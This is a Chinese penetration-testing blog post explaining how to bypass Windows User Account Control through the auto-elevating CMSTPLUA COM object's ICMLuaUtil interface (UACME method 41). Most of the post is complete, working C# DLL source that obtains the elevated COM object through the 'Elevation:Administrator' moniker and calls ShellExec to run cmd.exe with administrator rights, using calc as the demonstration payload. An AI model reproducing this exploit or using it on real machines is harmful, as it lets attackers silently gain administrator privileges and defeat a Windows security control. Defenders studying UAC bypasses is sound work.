---
title: "BypassUAC With ICMLuaUtil"
date: 2020-05-21T09:58:33+08:00
draft: false
tags:
- BypassUAC
- ICMLuaUtil
series:
-
categories:
- 渗透测试
---


本文主要讲述UACME项目中索引为41的ICMLuaUtil方法为例实现一个bypassuac，该方法原理在于调用COM组件中自动提权并且可以执行命令的接口。
<!--more-->

## 什么类型的COM组件可以利用
以下是UACME项目对使用`ICMLuaUtil`方式的描述

```
Author: Oddvar Moe
Type: Elevated COM interface
Method: ICMLuaUtil
Target(s): Attacker defined
Component(s): Attacker defined
Implementation: ucmCMLuaUtilShellExecMethod
Works from: Windows 7 (7600)
Fixed in: unfixed ?
How: -
```
查看[该方法对应的源码](https://github.com/hfiref0x/UACME/blob/master/Source/Akagi/methods/api0cradle.c#L55)发现是`CMSTPLUA`组件下的`ICMLuaUtil`接口。使用OleViewDotNet工具以管理员身份运行，查看对应的COM属性信息。

![image.png](https://y4er.com/img/uploads/20200521091968.png)

右键查看该组件的Elevation属性
![image.png](https://y4er.com/img/uploads/20200521094727.png)

首先这里的`Enable`、`Auto Approval`属性为`True`表示可以用该组件来绕过UAC认证，这是利用条件第一点。

第二点是需要该组件中存在执行命令的点，根据上图知道该函数位于cmlua.dll。通过OleViewDotNet提供的偏移量找到虚函数表。
![image.png](https://y4er.com/img/uploads/20200521099447.png)

## 使用csharp调用ICMLuaUtil.ShellExec执行命令
vs创建新项目，然后添加`DllExport`类库
![image.png](https://y4er.com/img/uploads/20200521092633.png)

装完之后会自动运行一个init.ps1脚本弹出来一个框，让你设置要导出的dll配置。
![image.png](https://y4er.com/img/uploads/20200521092045.png)

按图配置，点击apply，然后vs中提示重新加载文件。

先来一个最简单的dll，添加`System.Windows.Forms`引用之后生成dll

```csharp

using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;


namespace MyBypassUAC
{
    public class Class1
    {
        [DllExport]
        public static void MyBypassUAC()
        {
            MessageBox.Show("aa");
        }
    }

}

```
**注意：你需要运行你生成对应系统位数的dll，否则你会碰到这样的错误**
![image.png](https://y4er.com/img/uploads/20200521102764.png)

运行x64的dll
![image.png](https://y4er.com/img/uploads/20200521108666.png)
这样就是一个简单的demo了。接下来写bypassuac的东西。

```csharp
using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;


namespace MyBypassUAC
{
    public class Class1
    {
        internal enum HRESULT : long
        {
            S_FALSE = 0x0001,
            S_OK = 0x0000,
            E_INVALIDARG = 0x80070057,
            E_OUTOFMEMORY = 0x8007000E
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct BIND_OPTS3
        {
            internal uint cbStruct;
            internal uint grfFlags;
            internal uint grfMode;
            internal uint dwTickCountDeadline;
            internal uint dwTrackFlags;
            internal uint dwClassContext;
            internal uint locale;
            object pServerInfo; // will be passing null, so type doesn't matter
            internal IntPtr hwnd;
        }

        [Flags]
        internal enum CLSCTX
        {
            CLSCTX_INPROC_SERVER = 0x1,
            CLSCTX_INPROC_HANDLER = 0x2,
            CLSCTX_LOCAL_SERVER = 0x4,
            CLSCTX_REMOTE_SERVER = 0x10,
            CLSCTX_NO_CODE_DOWNLOAD = 0x400,
            CLSCTX_NO_CUSTOM_MARSHAL = 0x1000,
            CLSCTX_ENABLE_CODE_DOWNLOAD = 0x2000,
            CLSCTX_NO_FAILURE_LOG = 0x4000,
            CLSCTX_DISABLE_AAA = 0x8000,
            CLSCTX_ENABLE_AAA = 0x10000,
            CLSCTX_FROM_DEFAULT_CONTEXT = 0x20000,
            CLSCTX_INPROC = CLSCTX_INPROC_SERVER | CLSCTX_INPROC_HANDLER,
            CLSCTX_SERVER = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_REMOTE_SERVER,
            CLSCTX_ALL = CLSCTX_SERVER | CLSCTX_INPROC_HANDLER
        }

        const ulong SEE_MASK_DEFAULT = 0x0;
        const ulong SW_SHOW = 0x5;

        [DllImport("ole32.dll", CharSet = CharSet.Unicode, ExactSpelling = true, PreserveSig = false)]
        [return: MarshalAs(UnmanagedType.Interface)]
        internal static extern object CoGetObject(
          string pszName,
          [In] ref BIND_OPTS3 pBindOptions,
          [In, MarshalAs(UnmanagedType.LPStruct)] Guid riid);

        [DllExport]
        public static void MyBypassUAC()
        {
            Guid classId_cmstplua = new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7");
            // Interface ID
            Guid interfaceId_icmluautil = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");

            ICMLuaUtil icm = (ICMLuaUtil)LaunchElevatedCOMObject(classId_cmstplua, interfaceId_icmluautil); ;
            icm.ShellExec(@"cmd.exe", string.Format("/c {0}", "calc"), @"C:\windows\system32\", SEE_MASK_DEFAULT, SW_SHOW);
            Marshal.ReleaseComObject(icm);
        }

        public static object LaunchElevatedCOMObject(Guid Clsid, Guid InterfaceID)
        {
            string CLSID = Clsid.ToString("B");
            string monikerName = "Elevation:Administrator!new:" + CLSID;

            BIND_OPTS3 bo = new BIND_OPTS3();
            bo.cbStruct = (uint)Marshal.SizeOf(bo);
            bo.hwnd = IntPtr.Zero;
            bo.dwClassContext = (int)CLSCTX.CLSCTX_LOCAL_SERVER;

            object retVal = CoGetObject(monikerName, ref bo, InterfaceID);

            return (retVal);
        }

        [ComImport, Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface ICMLuaUtil
        {
            //[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            //void QueryInterface([In, MarshalAs(UnmanagedType.LPStruct)] Guid riid, [In, Out] ref IntPtr ppv);
            //[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            //void AddRef();
            //[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            //void Release();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method1();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method2();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method3();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method4();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method5();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method6();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            HRESULT ShellExec(
                [In, MarshalAs(UnmanagedType.LPWStr)]string file,
                [In, MarshalAs(UnmanagedType.LPWStr)]string paramaters,
                [In, MarshalAs(UnmanagedType.LPWStr)]string directory,
                [In]ulong fMask,
                [In]ulong nShow);
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method8();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method9();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method10();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method11();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method12();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method13();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method14();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method15();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method16();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method17();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method18();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method19();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method20();
        }
    }
}
```
通过创建ICMLuaUtil com对象icm，调用其方法ShellExec执行命令实现uac提权。

![image.png](https://y4er.com/img/uploads/20200521101885.png)

## 参考
1. https://cloud.tencent.com/developer/article/1623517
2. https://github.com/cnsimo/BypassUAC/tree/master/BypassUAC_Dll_csharp
3. https://github.com/Cn33liz/p0wnedShell/blob/master/p0wnedShell/Opsec/p0wnedMasq.cs
4. https://gist.github.com/Moriarty2016/931e86a70aadaf48b067d8a34f28a979


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**